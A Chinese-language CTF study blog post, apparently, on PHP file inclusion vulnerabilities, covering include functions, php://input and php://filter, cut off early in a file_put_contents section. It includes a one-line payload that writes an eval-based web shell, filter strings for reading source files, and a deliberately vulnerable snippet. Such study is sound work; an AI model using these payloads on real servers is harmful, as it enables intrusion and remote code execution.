@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="0x01 什么是文件包含漏洞通过PHP函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。 0x02 文件包含漏洞的环境要求allow_url_fopen&#x3D;On(默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include&#x3D;On(php5.2之后默认为Off) 规定是否允许include&#x2F;require远">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF文件包含漏洞总结">
+<meta property="og:url" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Echo">
+<meta property="og:description" content="0x01 什么是文件包含漏洞通过PHP函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。 0x02 文件包含漏洞的环境要求allow_url_fopen&#x3D;On(默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include&#x3D;On(php5.2之后默认为Off) 规定是否允许include&#x2F;require远">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221106381.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221326310.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227215417879.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-693b1469385893.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227220004241.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-499a1469385895.png">
+<meta property="og:image" content="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png">
+<meta property="og:image" content="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221548409.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221636438.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20190212183933220.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221906093.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226222627659.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224648338.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224742608.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224921625.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224952562.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLN4K.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220228211810119.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHLCD.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLobn.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHcNT.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHRCF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/08/14/dPHXgH.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHW34.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPL0jH.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLDud.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLFXj.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPH5uR.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHID1.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPHb4O.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPLfgg.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPzFjU.png">
+<meta property="og:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/dPzAuF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/08/14/dPHxKA.png">
+<meta property="article:published_time" content="2022-02-26T14:05:49.000Z">
+<meta property="article:modified_time" content="2022-03-04T08:45:13.849Z">
+<meta property="article:author" content="CJ">
+<meta property="article:tag" content="STUDY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221106381.png">
+
+
+<link rel="canonical" href="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/","path":"2022/02/26/CTF文件包含漏洞总结/","title":"CTF文件包含漏洞总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CTF文件包含漏洞总结 | Echo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Echo</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">0x01 什么是文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%8E%AF%E5%A2%83%E8%A6%81%E6%B1%82"><span class="nav-number">2.</span> <span class="nav-text">0x02 文件包含漏洞的环境要求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">0x03 常见文件包含函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">4.</span> <span class="nav-text">0x04 PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter%E7%9A%84%E5%A6%99%E7%94%A8"><span class="nav-number">4.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter的妙用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%8C%85%E5%90%ABApache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">5.</span> <span class="nav-text">0x05 包含Apache日志文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%8C%85%E5%90%ABSESSION"><span class="nav-number">6.</span> <span class="nav-text">0x06 包含SESSION</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-%E5%8C%85%E5%90%AB-pros-self-environ"><span class="nav-number">7.</span> <span class="nav-text">0x07 包含&#x2F;pros&#x2F;self&#x2F;environ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="nav-number">8.</span> <span class="nav-text">0x08 包含临时文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-%E5%8C%85%E5%90%AB%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">9.</span> <span class="nav-text">0x09 包含上传文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number"></span> <span class="nav-text">文件包含漏洞的绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E6%8C%87%E5%AE%9A%E5%89%8D%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">0x01 指定前缀绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">1.1.</span> <span class="nav-text">一、目录遍历</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.</span> <span class="nav-text">二、编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-%E6%8C%87%E5%AE%9A%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">0x10 指定后缀绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%88%A9%E7%94%A8url"><span class="nav-number">2.1.</span> <span class="nav-text">一、利用url</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.2.</span> <span class="nav-text">二、利用协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="nav-number">2.3.</span> <span class="nav-text">三、长度截断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-file-put-content"><span class="nav-number">3.</span> <span class="nav-text">0x11 file_put_content</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E5%AF%B9%E4%BA%8E%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">3.1.</span> <span class="nav-text">首先对于第一种情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">3.2.</span> <span class="nav-text">介绍第二种情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#convert-iconv"><span class="nav-number">3.3.</span> <span class="nav-text">convert.iconv.</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-usc-2"><span class="nav-number">3.4.</span> <span class="nav-text">1.usc-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-usc-4"><span class="nav-number">3.5.</span> <span class="nav-text">2.usc-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-utf-8%E4%B8%8Eutf-7%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E5%8C%96"><span class="nav-number">3.6.</span> <span class="nav-text">3.utf-8与utf-7之间的转化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="nav-number">3.7.</span> <span class="nav-text">第三种情况</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CJ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTF文件包含漏洞总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-26 22:05:49" itemprop="dateCreated datePublished" datetime="2022-02-26T22:05:49+08:00">2022-02-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-03-04 16:45:13" itemprop="dateModified" datetime="2022-03-04T16:45:13+08:00">2022-03-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>6.8k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>6 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="0x01-什么是文件包含漏洞"><a href="#0x01-什么是文件包含漏洞" class="headerlink" title="0x01 什么是文件包含漏洞"></a>0x01 什么是文件包含漏洞</h2><p>通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PHP&spm=1001.2101.3001.7020">PHP</a>函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。</p>
+<h2 id="0x02-文件包含漏洞的环境要求"><a href="#0x02-文件包含漏洞的环境要求" class="headerlink" title="0x02 文件包含漏洞的环境要求"></a>0x02 文件包含漏洞的环境要求</h2><p>allow_url_fopen=On(默认为On) 规定是否允许从远程服务器或者网站检索数据</p>
+<p>allow_url_include=On(php5.2之后默认为Off) 规定是否允许include/require远程文件</p>
+<h2 id="0x03-常见文件包含函数"><a href="#0x03-常见文件包含函数" class="headerlink" title="0x03 常见文件包含函数"></a>0x03 常见文件包含函数</h2><p>php中常见的文件包含函数有以下四种：</p>
+<pre><code>include()
+require()
+include_once()
+require_once()
+</code></pre>
+<p>include与require基本是相同的，除了错误处理方面:</p>
+<pre><code>include()，只生成警告（E_WARNING），并且脚本会继续
+require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本
+include_once()与require_once()，如果文件已包含，则不会包含，其他特性如上
+</code></pre>
+<h2 id="0x04-PHP伪协议"><a href="#0x04-PHP伪协议" class="headerlink" title="0x04 PHP伪协议"></a>0x04 PHP伪协议</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<p>一、php://input</p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。<br><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221106381.png" alt="image-20220226221106381"></p>
+<p>注：利用php://input还可以写入php木马,即在post中传入如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>二、php://filter</p>
+<p><strong>php://filter</strong>可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221326310.png" alt="image-20220226221326310"></p>
+<p>POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<h3 id="php-filter的妙用"><a href="#php-filter的妙用" class="headerlink" title="php://filter的妙用"></a>php://filter的妙用</h3><p>XXE中的使用</p>
+<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
+<p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
+<p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title"><span class="built_in">readfile</span></span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;</span>);</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220227215417879.png" alt="image-20220227215417879"></p>
+<p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。</p>
+<p>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/thum-693b1469385893.png"></p>
+<p><strong>巧用编码与解码</strong></p>
+<p>使用编码不光可以帮助我们获取文件，也可以帮我们去除一些“不必要的麻烦”。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_POST</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
